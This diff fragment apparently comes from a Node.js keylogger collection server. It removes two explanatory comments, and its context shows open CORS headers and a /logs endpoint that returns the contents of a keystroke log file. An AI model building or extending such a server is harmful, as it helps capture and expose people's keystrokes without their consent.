@@ -12,7 +12,6 @@ const server = http.createServer((req, res) => {
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-  // Handle preflight requests
   if (req.method === 'OPTIONS') {
     res.writeHead(200);
     res.end();
@@ -48,7 +47,6 @@ const server = http.createServer((req, res) => {
       }
     });
   } else if (req.method === 'GET' && parsedUrl.pathname === '/logs') {
-    // Endpoint to view logs
     try {
       const logs = fs.readFileSync(KEYLOG_FILE, 'utf8');
       res.writeHead(200, { 'Content-Type': 'text/plain' });
